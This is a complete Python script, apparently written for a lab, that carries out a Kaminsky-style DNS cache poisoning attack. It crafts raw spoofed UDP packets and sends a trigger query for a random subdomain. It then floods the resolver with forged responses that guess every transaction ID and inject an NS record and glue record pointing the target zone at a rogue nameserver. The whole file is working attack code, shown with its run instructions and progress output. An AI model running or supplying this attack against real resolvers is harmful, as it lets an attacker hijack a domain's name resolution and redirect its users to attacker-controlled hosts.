"""
Usage (run as root):
    python3 kaminsky.py \
        --resolver  10.0.4.1       \
        --victim    10.0.3.200      \
        --auth-ns   <real auth NS IP> \
        --rogue-ns  <rogue NS hostname>  \
        --rogue-ip  <your rogue NS IP>
"""

import argparse
import random
import string
import time
import threading
import socket
import struct

def parse_args():
    p = argparse.ArgumentParser(
        description="Kaminsky DNS Cache Poisoning"
    )
    p.add_argument("--resolver",      default="10.0.4.1")
    p.add_argument("--victim",        default="10.0.3.200",
                   help="Machine that will receive the responses from the Resolver, in this case the NS Attacker itself")
    p.add_argument("--auth-ns",       default="10.0.2.1",
                   help="Real authoritative NS IP (spoofed as packet source)")
    p.add_argument("--rogue-ns",      default="www.example.com",
                   help="Rogue NS hostname that will appear in the poisoned cache")
    p.add_argument("--rogue-ip",      default="10.0.3.200",
                   help="IP of your rogue NS machine — injected as glue record")
    p.add_argument("--zone",          default="example.com.")
    p.add_argument("--spoof-ip",      default="1.2.3.4",
                   help="A record IP for the random subdomain answer")
    p.add_argument("--victim-port",   type=int, default=12345)
    p.add_argument("--res-port",      type=int, default=53,
                   help="Resolver outgoing port to guess (default: 53)")
    p.add_argument("--threads",       type=int, default=1)
    p.add_argument("--subdomain-len", type=int, default=8)
    p.add_argument("--batch-size",    type=int, default=65535,
                   help="TIDs per subdomain before moving on (default: 65535)")
    p.add_argument("--trigger-wait",  type=float, default=0.05,
                   help="Seconds to wait after trigger (default: 0.05)")
    p.add_argument("--max-rounds",    type=int, default=0,
                   help="Max full sweeps per thread, 0=unlimited")
    return p.parse_args()

# ── Raw packet construction ───────────────────────────────────────────────────

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff


def encode_dns_name(name):
    out = b''
    for label in name.rstrip('.').split('.'):
        out += bytes([len(label)]) + label.encode()
    return out + b'\x00'


def build_udp_ip(src_ip, dst_ip, sport, dport, payload):
    udp_len = 8 + len(payload)
    pseudo  = (socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
               + struct.pack('!BBH', 0, 17, udp_len))
    udp_cs  = checksum(pseudo + struct.pack('!HHHH', sport, dport, udp_len, 0) + payload)
    udp     = struct.pack('!HHHH', sport, dport, udp_len, udp_cs)

    ip_len  = 20 + udp_len
    ip_hdr  = struct.pack('!BBHHHBBH4s4s',
                  0x45, 0, ip_len,
                  random.randint(0, 65535), 0,
                  64, 17, 0,
                  socket.inet_aton(src_ip),
                  socket.inet_aton(dst_ip))
    ip_cs   = checksum(ip_hdr)
    ip_hdr  = ip_hdr[:10] + struct.pack('!H', ip_cs) + ip_hdr[12:]
    return ip_hdr + udp + payload


def build_dns_query(fqdn):
    tid   = random.randint(1, 65535)
    qname = encode_dns_name(fqdn)
    qsec  = qname + struct.pack('!HH', 1, 1)
    return struct.pack('!HHHHHH', tid, 0x0100, 1, 0, 0, 0) + qsec


def build_dns_response(tid, fqdn, zone, spoof_ip, rogue_ns, rogue_ip):
    """
    Build a spoofed DNS response with:
      ANSWER:     fqdn      A   spoof_ip   (plausible answer)
      AUTHORITY:  zone      NS  rogue_ns   (zone poison)
      ADDITIONAL: rogue_ns  A   rogue_ip   (glue record)
    """
    qname      = encode_dns_name(fqdn)
    zname      = encode_dns_name(zone)
    rogue_name = encode_dns_name(rogue_ns)

    # Question
    qsec = qname + struct.pack('!HH', 1, 1)

    # Answer: <fqdn> A <spoof_ip>
    ans  = qname + struct.pack('!HHIH', 1, 1, 86400, 4) + socket.inet_aton(spoof_ip)

    # Authority: <zone> NS <rogue_ns>
    # Calculate byte offset of rogue_name within the full packet so we can reference it via a compression pointer in the additional section.
    # Layout up to rogue_name: header(12) + qsec + ans + zname + type+class+ttl+rdlen(10)
    rogue_name_offset = 12 + len(qsec) + len(ans) + len(zname) + 10
    auth = zname + struct.pack('!HHIH', 2, 1, 86400, len(rogue_name)) + rogue_name

    # Additional (glue): compression pointer to rogue_name + A record
    # 0xC000 | offset is the RFC 1035 pointer format (top 2 bits = 11)
    ptr  = struct.pack('!H', 0xC000 | rogue_name_offset)
    glue = ptr + struct.pack('!HHIH', 1, 1, 86400, 4) + socket.inet_aton(rogue_ip)

    # Header: qdcount=1 ancount=1 nscount=1 arcount=1
    header = struct.pack('!HHHHHH', tid, 0x8400, 1, 1, 1, 1)

    return header + qsec + ans + auth + glue


# ── Pre-build one batch of flood packets ─────────────────────────────────────

def build_batch(auth_ns, resolver, res_port, fqdn, zone,
                spoof_ip, rogue_ns, rogue_ip, tids):
    pkts = []
    for tid in tids:
        dns = build_dns_response(tid, fqdn, zone, spoof_ip, rogue_ns, rogue_ip)
        pkts.append(build_udp_ip(auth_ns, resolver, 53, res_port, dns))
    return pkts


# ── Shared stats ──────────────────────────────────────────────────────────────

class Stats:
    def __init__(self):
        self._lock     = threading.Lock()
        self.rounds    = 0
        self.windows   = 0
        self.pkts_sent = 0
        self.t_start   = time.time()

    def add(self, pkts):
        with self._lock:
            self.pkts_sent += pkts
            self.windows   += 1

    def sweep_done(self):
        with self._lock:
            self.rounds += 1

    def report(self):
        with self._lock:
            elapsed = time.time() - self.t_start
            pps     = self.pkts_sent / elapsed if elapsed > 0 else 0
            return self.rounds, self.windows, self.pkts_sent, pps, elapsed


# ── Helpers ───────────────────────────────────────────────────────────────────

def random_subdomain(zone, length):
    label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{label}.{zone.rstrip('.')}."


# ── Worker thread ─────────────────────────────────────────────────────────────

def attack_worker(args, stats, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    dst  = (args.resolver, 0)

    all_tids = list(range(0, 65536))
    random.shuffle(all_tids)
    batches  = [all_tids[i:i + args.batch_size]
                for i in range(0, len(all_tids), args.batch_size)]

    sweep_n = 0
    while not stop_event.is_set():
        sweep_n += 1
        if args.max_rounds and sweep_n > args.max_rounds:
            break

        random.shuffle(batches)

        for batch in batches:
            if stop_event.is_set():
                break

            fqdn = random_subdomain(args.zone, args.subdomain_len)

            # 1. Trigger
            dns_q = build_dns_query(fqdn)
            trig  = build_udp_ip(args.victim, args.resolver,
                                 args.victim_port, 53, dns_q)
            sock.sendto(trig, dst)

            # 2. Wait for resolver to forward upstream
            time.sleep(args.trigger_wait)

            # 3. Blast batch with glue included
            pkts = build_batch(
                auth_ns  = args.auth_ns,
                resolver = args.resolver,
                res_port = args.res_port,
                fqdn     = fqdn,
                zone     = args.zone,
                spoof_ip = args.spoof_ip,
                rogue_ns = args.rogue_ns,
                rogue_ip = args.rogue_ip,
                tids     = batch,
            )
            for pkt in pkts:
                sock.sendto(pkt, dst)

            stats.add(len(batch) + 1)

        stats.sweep_done()

    sock.close()


# ── Progress printer ──────────────────────────────────────────────────────────

def progress_loop(stats, stop_event, interval=5.0):
    while not stop_event.is_set():
        time.sleep(interval)
        rounds, windows, pkts, pps, elapsed = stats.report()
        print(f"  [{elapsed:>7.1f}s]  sweeps: {rounds:>4,}  "
              f"windows: {windows:>7,}  pkts: {pkts:>10,}  pps: {pps:>8,.0f}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    args = parse_args()

    if not args.zone.endswith('.'):
        args.zone += '.'

    n_batches = -(-65536 // args.batch_size)

    print("=" * 65)
    print("  Kaminsky DNS Cache Poisoning")
    print("=" * 65)
    print(f"  Resolver         : {args.resolver}")
    print(f"  Final responses receiver    : {args.victim}:{args.victim_port}")
    print(f"  Auth NS spoofed  : {args.auth_ns}")
    print(f"  Target zone      : {args.zone}")
    print(f"  Rogue NS         : {args.rogue_ns}  ->  {args.rogue_ip}  (glue)")
    print(f"  Spoof A record   : {args.spoof_ip}")
    print(f"  Guessed res port : {args.res_port}")
    print(f"  Threads          : {args.threads}")
    print(f"  Batch size       : {args.batch_size} TIDs per subdomain")
    print(f"  Batches per sweep: {n_batches:,}")
    print(f"  Trigger wait     : {args.trigger_wait*1000:.0f}ms")
    print()
    print("  Each response carries:")
    print(f"    ANSWER:     <rand>.{args.zone}  A  {args.spoof_ip}")
    print(f"    AUTHORITY:  {args.zone}  NS  {args.rogue_ns}")
    print(f"    ADDITIONAL: {args.rogue_ns}  A  {args.rogue_ip}  <- glue")
    print("=" * 65)
    print()
    print(f"  {'Elapsed':>8}   {'Sweeps':>6}   {'Windows':>8}   "
          f"{'Pkts sent':>11}   {'Pkt/s':>9}")
    print(f"  {'-'*8}   {'-'*6}   {'-'*8}   {'-'*11}   {'-'*9}")

    stats      = Stats()
    stop_event = threading.Event()

    workers = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack_worker,
                             args=(args, stats, stop_event),
                             daemon=True)
        t.start()
        workers.append(t)

    try:
        progress_loop(stats, stop_event)
    except KeyboardInterrupt:
        print("\n\n  Interrupted — stopping threads...")
        stop_event.set()

    for t in workers:
        t.join(timeout=2)

    rounds, windows, pkts, pps, elapsed = stats.report()
    print()
    print("=" * 65)
    print(f"  Threads  : {args.threads}")
    print(f"  Sweeps   : {rounds:,}")
    print(f"  Windows  : {windows:,}")
    print(f"  Pkts sent: {pkts:,}")
    print(f"  Elapsed  : {elapsed:.1f}s")
    print(f"  Avg pps  : {pps:,.0f}")
    print("=" * 65)

if __name__ == "__main__":
    main()
